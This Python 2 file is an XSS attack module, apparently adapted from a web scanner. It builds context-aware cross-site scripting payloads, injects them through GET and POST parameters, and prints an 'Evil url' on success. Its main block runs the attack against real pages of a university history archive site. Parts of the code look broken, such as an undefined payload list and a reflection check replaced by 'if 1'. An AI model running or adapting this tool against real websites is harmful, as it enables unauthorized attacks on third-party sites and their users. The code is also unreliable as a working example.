#!/usr/bin/env python
# -*- coding: utf-8 -*-

import random
import re
import socket
from bs4 import BeautifulSoup
from net.HttpClient import HttpClient
from net.HttpClient import HTTPResponse
from payloads.GetPayloads import loadPayloads


class Xss():
    
    
    GET_XSS = {}
    POST_XSS = {}
    
    def __init__(self):
        self.http = HttpClient()
        self.independant_payloads = loadPayloads()
        print '-------------------'
        print self.independant_payloads

    def study(self, obj, parent=None, keyword="", entries=[]):
        if str(obj).find(keyword) >= 0:
            if isinstance(obj, BeautifulSoup.Tag):
                if str(obj.attrs).find(keyword) >= 0:
                    for k, v in obj.attrs:
                        if v.find(keyword) >= 0:
                            entries.append({"type":"attrval", "name":k, "tag":obj.name})
                        if k.find(keyword) >= 0:
                            entries.append({"type":"attrname", "name":k, "tag":obj.name})
                elif obj.name.find(keyword) >= 0:
                    entries.append({"type":"tag", "value":obj.name})
                else:
                    for x in obj.contents:
                        self.study(x, obj, keyword,entries)
            elif isinstance(obj, BeautifulSoup.NavigableString):
                if str(obj).find(keyword) >= 0:
                    entries.append({"type":"text", "parent":parent.name})
        
    def generate_payloads(self, data, code):
        headers = {"Accept": "text/plain"}
        soup = BeautifulSoup(data)
        e = []
        self.study(soup, keyword = code, entries = e)
        
        payloads = []
        
        for elem in e:
            payload = ""
            if elem['type'] == "attrval":
                i0 = data.find(code)
                try:
                    i1 = data[:i0].rfind(elem['name'])
                except UnicodeDecodeError:
                    continue
                start = data[i1:i0].replace(" ", "")[len(elem['name']):]
                if start.startswith("='"): payload="'"
                if start.startswith('="'): payload='"'
                if elem['tag'].lower() == "img":
                    payload += "/>"
                else:
                    payload += "></" + elem['tag'] + ">"
                    
                for xss in self.independant_payloads:
                    payloads.append(payload + xss.replace("__XSS__", code))
            elif elem['type'] == "attrname":
                if code == elem['name']:
                    for xss in self.independant_payloads:
                        payloads.append('>' + xss.replace("__XSS__",code))
            elif elem['type'] == "tag":
                if elem['value'].startswith(code):
                    for xss in self.independant_payloads:
                        payloads.append(xss.replace("__XSS__", code)[1:])
                else:
                    for xss in self.independant_payloads:
                        payloads.append("/>" + xss.replace("__XSS__", code))
            elif elem['type'] == "text":
                payload = ""
                if elem['parent'] == "title":
                    payload = "</title>"
                for xss in self.independant_payloads:
                    payloads.append(payload + xss.replace("__XSS__", code))
                return payloads
            
            data = data.replace(code, "none", 1)
        return payloads
        
    
    def attack(self, urls, forms):
        for url, headers in urls.items():
            dictio = {}
            params = []
            page = url
            
            if url.find("?") >= 0:
                page = url.split('?')[0]
                query = url.split('?')[1]
                params = query.split('&')
                if query.find("=") >= 0:
                    for param in params:
                        dictio[param.split('=')[0]] = param.split('=')[1]
            
            self.aGet(page, dictio, headers)
            
    
    def aGet(self, page, dict, headers = {}):
        """This method performs the cross site scripting attack (XSS attack) with method GET"""
        print page
        print dict
        if dict == {}:         
            url = page + "?__XSS__"      
            code = "".join([random.choice("0123456789abcdefghjijklmnopqrstuvwxyz") for i in range(0,10)])
            url = page + "?" + code
            self.GET_XSS[code] = url
            try:
                data = self.http.send(url,method='get').getPage()
            except socket.timeout:
                data = ''
            print '----------------'
            #print data
            #if data.find(code) >= 0:
            if 1:
                print 'get it'
                payloads = self.generate_payloads(data, code)
                if payloads != []:
                    self.findXSS(page, {}, "", code, "", payloads, headers["link_encoding"])
        else:
            for k in dict.keys():
                err = ""
                tmp = dict.copy()
                tmp[k] = "__XSS__"
                url = page + "?" + self.http.encode(tmp, headers["link_encoding"])
                
                code = "".join([random.choice("0123456789abcdefghjijklmnopqrstuvwxyz") for i in range(0,10)])
                tmp[k] = code
                print tmp
                url = page + "?" + self.http.encode(tmp, headers["link_encoding"])
                self.GET_XSS[code] = url
                try:
                    data = self.http.send(url,method='get').getPage()
                except socket.timeout:
                    data = ''
                
                #if data.find(code) >= 0:
                print '^^^^^^^^^^^^^^^^^^^'
                print data
                if 1:
                    print 'get it'
                    payloads = self.generate_payloads(data, code)
                    print payloads
                    if payloads != []:
                        self.findXSS(page, tmp, k, code, "", payloads, headers["link_encoding"])
            
    def findXSS(self, page, args, var, code, referer, payloads, encoding=None):
        headers = {"Accept": "text/plain"}
        params = args.copy()
        url = page
        
        # ok let's send the requests
        for payload in payloads:
            if params == {}:
                url = page + "?" + self.http.quote(payload)
                try:
                    dat = self.http.send(url,method='get').getPage()
                except socket.timeout:
                    dat = ""
                var = "QUERY_STRING"
            
            else:
                params[var] = payload
                
                if referer != "": #POST
                    try:
                        dat = self.http.send(page, self.http.encode(params, encoding), headers,method='post').getPage()
                    except socket.timeout:
                        dat = ""
                else:#GET
                    url = page + "?" + self.http.encode(params, encoding)
                    try:
                        dat = self.http.send(url,method='get').getPage()
                    except socket.timeout:
                        dat = ""
                        
            if self.validXSS(dat, code):
                if params != {}:
                    pass
                
                if referer != "":
                    print _("Found XSS in"), page
                    print "  " + _("with params") + " =", self.http.encode(params, encoding)
                    print "  " + _("coming from"), referer
                else:
                    print _("XSS") + " (" + var + ") " + _("in"), page
                    print "  " + _("Evil url") + ":", url
                return True
##########################################################
###### try the same things but with raw characters #######
            if params == {}:
                url = page + "?" + payload
                try:
                    dat = self.http.send(url).getPage()
                except socket.timeout:
                    dat = ""
                var = "QUERY_STRING"
            else:
                params[var] = payload
                
                if referer != "": #POST
                    try:
                        dat = self.http.send(page, self.http.uqe(params, encoding), headers).getPage()
                    except socket.timeout:
                        dat = ""
                else:#GET
                    url = page + "?" + self.http.uqe(params, encoding)
                    try:
                        dat = self.http.send(url).getPage()
                    except socket.timeout:
                        dat = ""
            if self.validXSS(dat, code):
                if params != {}:
                    pass
                    
                if referer != "":
                    print _("Found raw XSS in"), page
                    print "  " + _("with params") + " =", self.http.uqe(params, encoding)
                    print "  " + _("coming from"), referer
                else:
                    print _("Raw XSS") + " (" + var + ") " + _("in"), page
                    print "  " + _("Evil url") + ":", url
                return True
            
        return False

    
    
    def validXSS(self, page, code):
        if page == None or page == "":
            return False
        soup = BeautifulSoup.BeautifulSoup(page)
        for x in soup.findAll("script"):
            if x.string != None and x.string in [t.replace("__XSS__", code) for t in self.script_ok]:
                return True
            elif x.has_key("src"):
                if x["src"] == "http://__XSS__/x.js".replace("__XSS__", code):
                    return True
        return False
                    
       
       
if __name__ == "__main__":
    u = {u'http://history.sysu.edu.cn/archive/index.php?cateid=1': {'status': '200', 'content-location': u'http://history.sysu.edu.cn/archive/index.php?cateid=1', 'x-powered-by': 'PHP/4.3.10, ASP.NET', 'set-cookie': 'lastfid=0; expires=Fri, 14-Jun-2013 06:06:55 GMT; path=/, lastvisit=0%091339654015%09%2Farchive%2Findex.php%3Fcateid%3D1; expires=Fri, 14-Jun-2013 06:06:55 GMT; path=/, ol_offset=3492; expires=Fri, 14-Jun-2013 06:06:55 GMT; path=/', 'server': 'Microsoft-IIS/6.0', 'connection': 'close', 'link_encoding': 'gbk', 'date': 'Thu, 14 Jun 2012 06:06:55 GMT', 'content-type': 'text/html'}, u'http://history.sysu.edu.cn/archive/index.php?online=yes': {'status': '200', 'content-location': u'http://history.sysu.edu.cn/archive/index.php?online=yes', 'x-powered-by': 'PHP/4.3.10, ASP.NET', 'set-cookie': 'lastfid=0; expires=Fri, 14-Jun-2013 06:07:14 GMT; path=/, lastvisit=0%091339654034%09%2Farchive%2Findex.php%3Fonline%3Dyes; expires=Fri, 14-Jun-2013 06:07:14 GMT; path=/, ol_offset=3492; expires=Fri, 14-Jun-2013 06:07:14 GMT; path=/, online1=yes; expires=Fri, 14-Jun-2013 06:07:14 GMT; path=/', 'server': 'Microsoft-IIS/6.0', 'connection': 'close', 'link_encoding': 'gbk', 'date': 'Thu, 14 Jun 2012 06:07:14 GMT', 'content-type': 'text/html'}, u'http://history.sysu.edu.cn/archive/index.php?cateid=9': {'status': '200', 'content-location': u'http://history.sysu.edu.cn/archive/index.php?cateid=9', 'x-powered-by': 'PHP/4.3.10, ASP.NET', 'set-cookie': 'lastfid=0; expires=Fri, 14-Jun-2013 06:07:07 GMT; path=/, lastvisit=0%091339654027%09%2Farchive%2Findex.php%3Fcateid%3D9; expires=Fri, 14-Jun-2013 06:07:07 GMT; path=/, ol_offset=3492; expires=Fri, 14-Jun-2013 06:07:07 GMT; path=/', 'server': 'Microsoft-IIS/6.0', 'connection': 'close', 'link_encoding': 'gbk', 'date': 'Thu, 14 Jun 2012 06:07:07 GMT', 'content-type': 'text/html'}, u'http://history.sysu.edu.cn/archive/index.php?online=no': {'status': '200', 'content-location': u'http://history.sysu.edu.cn/archive/index.php?online=no', 'x-powered-by': 'PHP/4.3.10, ASP.NET', 'set-cookie': 'lastfid=0; expires=Fri, 14-Jun-2013 06:07:18 GMT; path=/, lastvisit=0%091339654038%09%2Farchive%2Findex.php%3Fonline%3Dno; expires=Fri, 14-Jun-2013 06:07:18 GMT; path=/, ol_offset=3492; expires=Fri, 14-Jun-2013 06:07:18 GMT; path=/, online1=no; expires=Fri, 14-Jun-2013 06:07:18 GMT; path=/', 'server': 'Microsoft-IIS/6.0', 'connection': 'close', 'link_encoding': 'gbk', 'date': 'Thu, 14 Jun 2012 06:07:18 GMT', 'content-type': 'text/html'}, u'http://history.sysu.edu.cn/archive/index.php': {'status': '200', 'content-location': u'http://history.sysu.edu.cn/archive/index.php', 'x-powered-by': 'PHP/4.3.10, ASP.NET', 'set-cookie': 'lastfid=0; expires=Fri, 14-Jun-2013 06:06:53 GMT; path=/, lastvisit=0%091339654013%09%2Farchive%2Findex.php%3F; expires=Fri, 14-Jun-2013 06:06:53 GMT; path=/, ol_offset=3492; expires=Fri, 14-Jun-2013 06:06:53 GMT; path=/', 'server': 'Microsoft-IIS/6.0', 'connection': 'close', 'link_encoding': 'gbk', 'date': 'Thu, 14 Jun 2012 06:06:53 GMT', 'content-type': 'text/html'}, u'http://history.sysu.edu.cn/archive/index.php?cateid=10': {'status': '200', 'content-location': u'http://history.sysu.edu.cn/archive/index.php?cateid=10', 'x-powered-by': 'PHP/4.3.10, ASP.NET', 'set-cookie': 'lastfid=0; expires=Fri, 14-Jun-2013 06:07:04 GMT; path=/, lastvisit=0%091339654024%09%2Farchive%2Findex.php%3Fcateid%3D10; expires=Fri, 14-Jun-2013 06:07:04 GMT; path=/, ol_offset=3492; expires=Fri, 14-Jun-2013 06:07:04 GMT; path=/', 'server': 'Microsoft-IIS/6.0', 'connection': 'close', 'link_encoding': 'gbk', 'date': 'Thu, 14 Jun 2012 06:07:04 GMT', 'content-type': 'text/html'}, u'http://history.sysu.edu.cn/archive/index.php?cateid=11': {'status': '200', 'content-location': u'http://history.sysu.edu.cn/archive/index.php?cateid=11', 'x-powered-by': 'PHP/4.3.10, ASP.NET', 'set-cookie': 'lastfid=0; expires=Fri, 14-Jun-2013 06:07:02 GMT; path=/, lastvisit=0%091339654022%09%2Farchive%2Findex.php%3Fcateid%3D11; expires=Fri, 14-Jun-2013 06:07:02 GMT; path=/, ol_offset=3492; expires=Fri, 14-Jun-2013 06:07:02 GMT; path=/', 'server': 'Microsoft-IIS/6.0', 'connection': 'close', 'link_encoding': 'gbk', 'date': 'Thu, 14 Jun 2012 06:07:02 GMT', 'content-type': 'text/html'}, u'http://history.sysu.edu.cn/archive/index.php?cateid=57': {'status': '200', 'content-location': u'http://history.sysu.edu.cn/archive/index.php?cateid=57', 'x-powered-by': 'PHP/4.3.10, ASP.NET', 'set-cookie': 'lastfid=0; expires=Fri, 14-Jun-2013 06:06:58 GMT; path=/, lastvisit=0%091339654018%09%2Farchive%2Findex.php%3Fcateid%3D57; expires=Fri, 14-Jun-2013 06:06:58 GMT; path=/, ol_offset=3492; expires=Fri, 14-Jun-2013 06:06:58 GMT; path=/', 'server': 'Microsoft-IIS/6.0', 'connection': 'close', 'link_encoding': 'gbk', 'date': 'Thu, 14 Jun 2012 06:06:58 GMT', 'content-type': 'text/html'}}

    x = Xss()
    x.attack(u,'jj') 
        
        